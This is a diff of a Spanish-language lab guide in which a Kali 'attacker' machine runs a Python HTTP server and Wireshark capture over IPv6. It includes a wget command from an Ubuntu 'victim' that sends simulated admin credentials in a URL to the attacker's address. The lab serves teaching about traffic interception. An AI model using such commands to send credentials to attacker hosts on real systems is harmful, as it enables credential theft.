@@ -68,7 +68,13 @@ En el Atacante (Kali): Levantamos un servidor escuchando específicamente en la 
 sudo python3 -m http.server 80 --bind 2001:1234::1
 ```
 
-### Paso 2: Simulación de envío de credenciales.
+### Paso 2: Wireshark.
+En nuestra máquina Atacante (Kali) podemos también dejar Wireshark funcionando de fondo con un filtro http.
+```bash
+sudo wireshark -i eth0 -k -Y http
+```
+
+### Paso 3: Simulación de envío de credenciales.
 En la Víctima (Ubuntu): Simulamos el envío de credenciales mediante una petición HTTP:
 ```bash
 wget "[http://[2001:1234::1]/login?usuario=admin&pass=capturado](http://[2001:1234::1]/login?usuario=admin&pass=capturado)"
